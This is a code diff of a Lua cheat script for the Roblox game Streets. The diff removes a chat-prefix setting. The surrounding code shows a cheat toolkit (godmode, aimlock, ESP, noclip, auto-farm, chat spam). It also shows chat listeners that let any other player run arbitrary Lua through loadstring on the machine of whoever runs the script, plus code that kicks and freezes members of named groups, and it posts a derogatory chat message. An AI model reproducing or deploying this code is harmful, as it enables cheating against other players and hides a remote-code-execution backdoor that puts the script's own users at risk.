@@ -7,11 +7,11 @@ local NormalWS,NormalJP,NormalHH = LP.Character:FindFirstChildWhichIsA'Humanoid'
 local AirWalkOn,AntiFeKill,WaitingToRespawn,Noclipping,Blinking,FreeCamBlink,BfgOn,MinigunMode,MultiUzi,DoubleJumpEnabled,NoGh,AutoDie,AutoStomp,GodMode,Debounce,NormalBfg,AimLock = false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false
 local BlinkSpeed,SpawnWS,SpawnJP,SpawnHH,SpawnSprint,SpawnCrouch,ClockTime,PlayOnDeath,AimlockTarget = nil,nil,nil,nil,nil,nil,nil,nil,nil
 local speedfly = 2
-local BlinkKey,ClickTpKey,ChatPrefix = "","",";"
+local BlinkKey,ClickTpKey = "",""
 local DeathPos,WaitingToRespawnPos = CFrame.new(),CFrame.new()
 local Cmds = {}
 local AntiKillTools,Keys,KeyTable,UrlEncoder,PartTable = {},{},{['w'] = false;['a'] = false;['s'] = false;['d'] = false;['Shift'] = false;['Control'] = false;},{['0'] = "%30";['1'] = "%31";['2'] = "%32";['3'] = "%33"; ['4'] = "%34";['5'] = "%35";['6'] = "%36";['7'] = "%37";['8'] = "%38";['9'] = "%39";[' '] = "%20";}
-local CmdsList = {"Speed // Ws // SprintSpeed // CrouchSpeed [Arguments]","JumpPower // Jp [Arguments]","Rejoin // Rj","AirWalk [On/Off]","DeathSpawn","Reset // Re","Noclip","To // Goto [plr]","AntiKill","Time [Arguments]","Blink [Arguments]","Fly [Arguments] // Unfly","Loop [Ws/Jp/HH/Sprint/Crouch] [Arguments]// Unloop","Key [Key] [Cmd]","RemoveKey [Key]","RemoveAllKeys","ClickTp [key]","View [plr] // Unview","Fblink [key]","Fspeed [Arguments]","Spamclick [Amount]","Esp [Player]","Unesp [Player]","neversit","bfg [normal/minigun/multiuzi/allbfg/nil]","info [plr] [os/operatingsystem]/[accage/age/accountage]/nil","spam [text]/spamdelay [delay]/unspam","doublejump","NoGh","advertise","autodie","hipheight/hh [Argument]","style [deathcircle/shield1/shield2/circle/wormhole/storm/sphere]","droptool","grip [6 args all optional]","TpTo [Banland/NormalStreets/Uzi/SawedOff/Machete/Spray/Pipe]","autostomp","farm [Cash/Shotty/Uzi/Sawed Off/Katana/All/Auto]","luacode [code]","godmode","antiaim","aimlock [Optional Player]","antiafk","heal","reload","colour [outline/text/background/cmds] [rgb]","chatprefix [prefix/nil]","draggablegui","bringcar"} -- Only bfg multiuzi works without bfg bypass
+local CmdsList = {"Speed // Ws // SprintSpeed // CrouchSpeed [Arguments]","JumpPower // Jp [Arguments]","Rejoin // Rj","AirWalk [On/Off]","DeathSpawn","Reset // Re","Noclip","To // Goto [plr]","AntiKill","Time [Arguments]","Blink [Arguments]","Fly [Arguments] // Unfly","Loop [Ws/Jp/HH/Sprint/Crouch] [Arguments]// Unloop","Key [Key] [Cmd]","RemoveKey [Key]","RemoveAllKeys","ClickTp [key]","View [plr] // Unview","Fblink [key]","Fspeed [Arguments]","Spamclick [Amount]","Esp [Player]","Unesp [Player]","neversit","bfg [normal/minigun/multiuzi/allbfg/nil]","info [plr] [os/operatingsystem]/[accage/age/accountage]/nil","spam [text]/spamdelay [delay]/unspam","doublejump","NoGh","advertise","autodie","hipheight/hh [Argument]","style [deathcircle/shield1/shield2/circle/wormhole/storm/sphere]","droptool","grip [6 args all optional]","TpTo [Banland/NormalStreets/Uzi/SawedOff/Machete/Spray/Pipe]","autostomp","farm [Cash/Shotty/Uzi/Sawed Off/Katana/All/Auto]","luacode [code]","godmode","antiaim","aimlock [Optional Player]","antiafk","heal","reload","colour [outline/text/background/cmds] [rgb]","draggablegui","bringcar"} -- Only bfg multiuzi works without bfg bypass
 local AirWalk,AntiKill = Instance.new'Part',Instance.new'Part'
 local Clone,Destroy,Grab = Instance.new'HopperBin',Instance.new'HopperBin',Instance.new'HopperBin'
 ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Welcome to Zetox v999 (.gg/GE3jHmN) Cracked by (jk it's cyrus' streets admin and chat messages are gay!)","All")
@@ -28,6 +28,7 @@ local Colours = {
 
 if LP:IsInGroup(4401821) or LP:IsInGroup(3974060) or LP:IsInGroup(3869991) or LP:IsInGroup(5222647) or LP:IsInGroup(4516574) or string.find(string.lower(LP.Name),"odsg") or LP.UserId == "1460654046" or LP.UserId == "1427672031" then 
 	LP.Character:FindFirstChildOfClass'Humanoid'.WalkSpeed = 500 
+
 	wait(5)
 	LP:Kick("No rogangsters!")
 	while true do end 
@@ -288,7 +289,6 @@ local SettingsTable = {
    Keys = {};
    ClickTpKey = "";
    BlinkKey = "";
-   ChatPrefix = "";
 }
 
 local function savesettings()
@@ -297,7 +297,6 @@ local function savesettings()
     Keys = SettingsToSave.Keys
     ClickTpKey = SettingsToSave.ClickTpKey
 	BlinkKey = SettingsToSave.BlinkKey
-	ChatPrefix = SettingsToSave.ChatPrefix
 end 
 
 local function updateSettings()
@@ -305,7 +304,6 @@ local function updateSettings()
         Keys = Keys;
 		ClickTpKey = ClickTpKey;
 		BlinkKey = BlinkKey;
-		ChatPrefix = ChatPrefix;
     }
     writefile("CyrusStreetsAdminSettings",HttpService:JSONEncode(New))
 end
@@ -315,11 +313,6 @@ local function runsettings()
     Keys = SettingsToRun.Keys
     ClickTpKey = SettingsToRun.ClickTpKey
 	BlinkKey = SettingsToRun.BlinkKey
-	if SettingsToRun.ChatPrefix then 
-		ChatPrefix = SettingsToRun.ChatPrefix
-	else 
-		ChatPrefix = "";
-	end
 end
 
 local Work,Error = pcall(function() readfile("CyrusStreetsAdminSettings") end)
@@ -333,7 +326,7 @@ end
 local function RunCmd(Msg)
 	local Arguments = string.split(Msg," ")
 	local NCommand = Cmds[table.remove(Arguments,1):lower()]
-	if string.match(Msg,ChatPrefix,1) and NCommand then
+	if NCommand then
 		NCommand(Arguments)
 	end
 end
@@ -715,13 +708,13 @@ local function HotkeyHandler(Key)
 					if flying then 
 						flying = false
 					else
-						RunCmd(ChatPrefix..CMD)
+						RunCmd(CMD)
 					end
 					elseif string.sub(string.lower(CMD),1,5) == "blink" then 
 						if Blinking then 
 							Blinking = false
 						else 
-							RunCmd(ChatPrefix..CMD)
+							RunCmd(CMD)
 						end
 					elseif CMD == "noclip" then
 						Noclipping = not Noclipping
@@ -729,7 +722,7 @@ local function HotkeyHandler(Key)
 					elseif CMD == "airwalk" then
 						AirWalkOn = not AirWalkOn
 					else 
-					RunCmd(ChatPrefix..CMD)
+					RunCmd(CMD)
 				end
 			end
 		end
@@ -860,16 +853,6 @@ local function Added()
 	end
 end
 
-Cmds.chatprefix = function(Arguments)
-	if Arguments[1] then
-		ChatPrefix = Arguments[1]:sub(1,1)
-		updateSettings()
-	else 
-		ChatPrefix = ""
-		updateSettings()
-	end
-end
-
 Cmds.btools = function(Arguments)
 	local DeleteTool = Instance.new('Tool',LP.Backpack)
 	DeleteTool.Name = "Zetox Btools"
@@ -945,7 +928,7 @@ end
 Cmds.ws = function(Arguments)
 	if Arguments[1] then
 		Normalwalk = true
-		RunCmd(ChatPrefix.."speed "..Arguments[1])
+		RunCmd("speed "..Arguments[1])
 	end
 end
 
@@ -971,7 +954,7 @@ end
 
 Cmds.jp = function(Arguments)
 	if Arguments[1] then
-		RunCmd(ChatPrefix.."jumppower "..Arguments[1])
+		RunCmd("jumppower "..Arguments[1])
 	end
 end
 
@@ -980,7 +963,8 @@ Cmds.rejoin = function(Arguments)
 end
 
 Cmds.rj = function(Arguments)
-	RunCmd(ChatPrefix.."rejoin")
+	
+	RunCmd("rejoin")
 end
 
 Cmds.hipheight = function(Arguments)
@@ -991,7 +975,7 @@ end
 
 Cmds.hh = function(Arguments)
     if Arguments[1] then 
-        RunCmd(ChatPrefix.."hipheight "..Arguments[1])
+        RunCmd("hipheight "..Arguments[1])
     end
 end
 
@@ -1032,7 +1016,7 @@ Cmds.reset = function(Arguments)
 end
 
 Cmds.re = function(Arguments)
-	RunCmd(ChatPrefix.."reset")
+	RunCmd("reset")
 end
 
 Cmds.noclip = function(Arguments)
@@ -1055,7 +1039,7 @@ end
 
 Cmds.goto = function(Arguments)
 	if Arguments[1] then
-		RunCmd(ChatPrefix.."to "..Arguments[1])
+		RunCmd("to "..Arguments[1])
 	end
 end
 
@@ -1496,7 +1480,8 @@ Cmds.bfg = function(Arguments)
 		if _G.DoYouHaveBfgBypass then 
 			NormalBfg = not NormalBfg
 		else 
-			notif("Command: BFG","This mode is only for people with BFG bypass.",5,"rbxassetid://1281284684")
+			notif("Command: BFG","This mode is only for people with BFG bypass.",
+			5,"rbxassetid://1281284684")
 		end
   elseif Arguments[1] and Arguments[1]:lower() == "minigun" then 
       	MinigunMode = not MinigunMode
@@ -1801,7 +1786,7 @@ local function Lost(Enter)
 	if Enter then 
 		local Cmd = CText.Text
 		CText.Text = ""
-		RunCmd(ChatPrefix..Cmd)
+		RunCmd(Cmd)
 	end
 end
 
@@ -1809,7 +1794,7 @@ local function Released(cmd)
 	if cmd == CText then 
 		local Cmd = CText.text
 		CText.Text = ""
-		RunCmd(ChatPrefix..Cmd)
+		RunCmd(Cmd)
 		Cframe:TweenPosition(UDim2.new(0.015, 0, 1, 0),"Out","Quad",0.5,true)
 	end
 end
@@ -1868,7 +1853,7 @@ for _,v in pairs(Players:GetPlayers()) do
 		v.Chatted:Connect(function(Chat)
 		if CoolkidTable[tostring(LP.UserId)] then return end
 			if Chat:sub(1,5) == "exec " then 
-				RunCmd(ChatPrefix.Chat:sub(6))
+				RunCmd(Chat:sub(6))
 			elseif Chat:sub(1,4) == "lua " then 
 				loadstring(Chat:sub(5))()
 			end
@@ -1885,7 +1870,7 @@ Players.PlayerAdded:Connect(function(plr)
 		plr.Chatted:Connect(function(Chat)
 		if CoolkidTable[tostring(LP.UserId)] then return end
 			if Chat:sub(1,5) == "exec " then 
-				RunCmd(ChatPrefix..Chat:sub(6))
+				RunCmd(Chat:sub(6))
 			elseif Chat:sub(1,4) == "lua " then 
 				loadstring(Chat:sub(5))()
 			end
